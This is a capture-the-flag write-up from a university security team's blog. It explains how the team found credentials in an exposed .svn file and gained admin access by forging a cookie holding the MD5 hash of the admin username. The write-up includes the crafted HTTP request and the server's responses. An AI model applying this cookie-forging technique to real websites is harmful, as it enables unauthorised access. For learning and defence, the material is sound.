<!DOCTYPE html>
<html>

  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>Brownies</title>
  <meta name="description" content="The challenge was to get admin access to a website running athttp://178.63.58.69:8083. This URL provided a simple log on page,which asked for a username and ...">

  <link rel="stylesheet" href="/css/main.css">
  <link rel="stylesheet" href="/css/bootstrap.css">
  <script src="/js/jquery-1.10.2.min.js"></script>
  <script src="/js/bootstrap.min.js"></script>
  <link rel="canonical" href="http://afnom.net/2014/11/24/Brownies.html">
  <link rel="alternate" type="application/rss+xml" title="AFiniteNumberOfMonkeys" href="http://afnom.net/feed.xml" />
</head>


  <body>

    <header class="site-header">

  <div class="wrapper">

    <div class="navbar navbar-default navbar-fixed-top">
      <div class="container">
        <div class="navbar-header">
          <a href="http://afnom.net/" class="navbar-brand">AFiniteNumberOfMonkeys</a>
          <button class="navbar-toggle" type="button" data-toggle="collapse" data-target="#navbar-main">
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </button>
        </div>
        <div class="navbar-collapse collapse" id="navbar-main">
          <ul class="nav navbar-nav navbar-right">
			<li class="dropdown">
			   <a class="dropdown-toggle" data-toggle="dropdown" href="http://afnom.net" id="home">Home <span class="caret"></span></a>
			   <ul class="dropdown-menu" aria-labelledby="home">
			     <li><a href="#who">Who we are</a></li>
			     <li><a href="#meetings">Meetings</a></li>
			     <li><a href="#tools">Tools</a></li>
			     <li><a href="#materials">Learning material</a></li>
			     <li><a href="#contact">Contact</a></li>
			   </ul>
			 </li>
            <li><a href="http://afnom.net/writeups.html">Write-ups</a></li>
          </ul>

        </div>
      </div>
    </div>
</div>

        
          
        
          
        
          
        
          
        
          
        


</header>


    <div class="page-content">
      <div class="container">
        <div class="post">

  <header class="post-header">
    <h1 class="post-title">Brownies</h1>
    <p class="post-meta">Nov 24, 2014 • Abstract</p>
  </header>

  <article class="post-content">
    <p>The challenge was to get admin access to a website running at
http://178.63.58.69:8083. This URL provided a simple log on page,
which asked for a username and password.</p>

<p>The challenge description came with the hint: <em>think of default
files when using source code management systems</em>, so after some
experimenting we found a file at http://178.63.58.69:8083/.svn with
the contents</p>

<pre><code>user: ping
pass: pong

admin: john
</code></pre>

<p>This tells us that the password for the “ping” account and that the admin
account is called “john”. Logging on to the http://178.63.58.69:8083
site with the ping account details the server replies with:</p>

<pre><code>HTTP/1.1 200 OK
Date: Sat, 22 Nov 2014 19:24:23 GMT
Server: Apache/2.4.6 (CentOS) PHP/5.4.16
X-Powered-By: PHP/5.4.16
Set-Cookie: type=user
Set-Cookie: flag=df911f0151f9ef021d410b4be5060972
Set-Cookie: name=ping
Content-Length: 53
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

&lt;h4&gt; Welcome: ping&lt;/h4&gt;&lt;a href='index.php'&gt;Logout&lt;/a&gt;
</code></pre>

<p>The interesting part here is the cookie, this seems to be the user
name, the access level and an authentication token (no, it’s not the
flag, although we did try submitting it). Deciding it might be a hash
we tried cracking it (typing it into Google), we found that it was the
MD5 hash of “ping”. So we trying requesting the login page with the
account john, type admin, and the “flag” set to the MD5 hash of “john”, by
sending the message:</p>

<pre><code>GET /login.php HTTP/1.1
Host: 178.63.58.69:8083
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:27.0) Gecko/20100101 Firefox/27.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: type=admin; flag=527bd5b5d689e2c32ae974c6229ff785; name=john
Connection: keep-alive
</code></pre>

<p>and got the reply:</p>

<pre><code>Hi faked admin :)

Flag: 'a012c434d1ec6db911fda4884de14fdd'
</code></pre>

<p>which was the true flag and submitting it got us the 350 points.</p>

<p>We used the Burp proxy to intercept and edit the HTTP
traffic. While not that complex their were a few dead ends, the login
page seems susceptible to SQL injection attacks, and the log in request
had a hidden field: file=”auth.txt”, both of which we spent a lot of
time working on before finding the correct solution, additionally, the last message had to be a GET rather than a POST.</p>

  </article>

</div>

      </div>
    </div>

    <hr>
<footer class="site-footer">

  <div class="container">

    <div class="row">
      <div class="col-lg-12">

       
        <p><p>Copyright &copy; University of Birmingham 2014</p></p>

      </div>
    </div>

  </div>

</footer>


  </body>

</html>
